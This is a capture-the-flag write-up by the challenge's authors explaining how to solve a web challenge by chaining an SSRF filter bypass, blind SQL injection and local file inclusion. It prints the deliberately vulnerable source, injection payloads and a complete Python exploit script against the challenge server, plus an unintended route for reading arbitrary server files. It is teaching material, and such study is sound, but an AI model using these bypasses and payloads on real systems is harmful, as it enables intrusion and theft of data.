---
title: Vuln Drive - InCTF Internationals 2021
author: Rohit
author_url: https://twitter.com/RohitNarayana11
date: 2021-08-15 19:00:05
tags : 
 - LFI
 - SSRF
 - SQLI
 - InCTFi
categories:
 - Web 
---
**tl;dr**

+ `/source` to get the source
+ Access local host from `dev_test`  using SSRF
+ SQLI to get the flag path a nd LFI to get the flag

<!--more-->

**Challenge Points** : 700
**No. of solves** : 27
**Challenge Author** : [Rohit](https://twitter.com/RohitNarayana11), [Skad00.sh](https://twitter.com/RahulSundar8), [Malf0y](https://twitter.com/mal_f0y), [Careless_finch](https://twitter.com/careless_finch)

## Description

Our new recruit worked on our new super secure file store and i am pretty sure he is good at what he does,it looks awesome.

## Introduction

This is our first challenge that we made for a CTF. The main idea is to chain 3 common vulnerabilities (SQLI, SSRF, LFI). We have made sure there is no guessing involved in our challenge. There was also an unintended solution. Hope everyone enjoyed the challenge.

## Intended solution

First we have to get the source of the web application from the `/source` endpoint (you can also get it using LFI). Going through the source you can find the `/dev_test` endpoint which is sending a get request to the URL we provide it. The URL is validated using the url_validate() function.

```python
def url_validate(url):
    blacklist = ["::1", "::"]
    for i in blacklist:
        if(i in url):
            return "NO hacking this time ({- _ -})"
    y = urlparse(url)
    hostname = y.hostname
    try:
        ip = socket.gethostbyname(hostname)
    except:
        ip = ""
    print(url, hostname,ip)
    ips = ip.split('.')
    if ips[0] in ['127', '0']:
        return "NO hacking this time ({- _ -})"
    else:
        try:
            url = unquote(url)          #  <==
            r = requests.get(url,allow_redirects = False)
            return r.text
        except:
            print(url, hostname)
            return "cannot get you url :)"

```

This is vulnerable to SSRF as it is URL decoding the input before sending the request. So we can bypass the filters by URL encoding our input (or you can brute-force the container ip :stuck_out_tongue_winking_eye:). Going through the source you can also find that the `/return_file` is vulnerable to LFI because the filename is concatenated without any sanitization. 

```python
@app.route('/return-files')
def return_files_tut():
    if auth():
        return redirect('/logout')
    filename=request.args.get("f")
    if(filename==None):
        return "No filenames provided"
    print(filename)
    if '..' in filename:
        return "No hack"
    file_path = os.path.join(app.config['UPLOAD_FOLDER'],str(session['uid']),filename)#  <==
    if(not os.path.isfile(file_path)):
        return "No such file exists"
    return send_file(file_path, as_attachment=True, attachment_filename=filename)
```

Visiting the local host using the SSRF we discussed above you can find the php page which is clearly vulnerable to SQL Injection.

```php+HTML
<?php
include('./conf.php');
$inp=$_GET['part1'];
$real_inp=$_GET['part2'];
if(preg_match('/[a-zA-Z]|\\\|\'|\"/i', $inp)) exit("Correct <!-- Not really -->");
if(preg_match('/\(|\)|\*|\\\|\/|\'|\;|\"|\-|\#/i', $real_inp)) exit("Are you me");
$inp=urldecode($inp);
//$query1=select name,path from adminfo;
$query2="SELECT * FROM accounts where id=1 and password='".$inp."'";
$query3="SELECT ".$real_inp.",name FROM accounts where name='tester'";
$check=mysqli_query($con,$query2);
if(!$_GET['part1'] && !$_GET['part2'])
{
    highlight_file(__file__);
    die();
}
if($check || !(strlen($_GET['part2'])<124))
{
    echo $query2."<br>";
    echo "Not this way<br>";
}
else
{
    $result=mysqli_query($con,$query3);
    $row=mysqli_fetch_assoc($result);
    if($row['name']==="tester")
        echo "Success";
    else
        echo "Not";
    //$err=mysqli_error($con);
    //echo $err;
}
?>
```

The script is executing the first query `$query2`. It is only executing the second query if there is an error in executing the first query. The intended solution is to error out the first query and to use blind injection in the second query to get the path.

To make an error in the first query we have to give just a `'` but that is blacklisted. URL encode comes again to save us. In the code you can see that we are again URL decoding the input. So we can put `%252527` to error out the first query.

In the second query there is a strict filter and there is a **length restriction** of 124 characters. The final payload is : `1,name from adminfo where path like 0x2f{x}25 union select 1` 

**Note** : This is a payload of exact length 124, anything with more length than this will not give you the full path. You can check the path you got is correct or not by just removing the `25` or you can check with `where path={path_you_got}` and confirm.

After getting the flag file path from the database. We can use the LFI mentioned above to download the flag file.

This is our final exploit.

```python
import requests

s=requests.Session()
url="http://web.challenge.bi0s.in:41666/"
path=""
s.post(url+'login',data={"username":"asdasd","password":"asdadssad"})
for i in range(33):
    for i in '1234567890abcdef':
        x = (path+i).encode().hex()
        data = {"url": f"http://123%40localhost?part1=%252527&part2=1,name from adminfo where path like 0x2f{x}25 union select 1"}
        r=s.post(url+'dev_test',data=data)
        if('Not' in r.text[:10]):
            path+=i
            print("Path :",path,end='\r')
            break
data = {"url": f"http://123%40localhost?part1=%252527&part2=1,name from adminfo where path=0x2f{(path).encode().hex()} union select 1"}
r = s.post(url+'dev_test', data=data)
print(r.text)
if('Not' in r.text[:10]):
    print("Length :",len(path))
    print("Path is correct!")
if path:
    print("Path :",path)
    r=s.get(url+'return-files?f=/'+path)
    print("Flag:",r.text)
```


## Unintended

The unintended solution is that we are blindly returning any file that you ask for. So you can pretty much download anything from the file system. As the requests are logged in the apache logs(access.log), you can find others solve script in there.

You can also download `/var/lib/mysql/challenge/adminfo.ibd` which will have the flag path.

It was a great learning experience for us. Congratulations for all those who solved it and all others who tried their best.

## Flag :

inctf{y0u_pr0v3d_th4t_1t_i5_n0t_53cur3_7765626861636b6572}
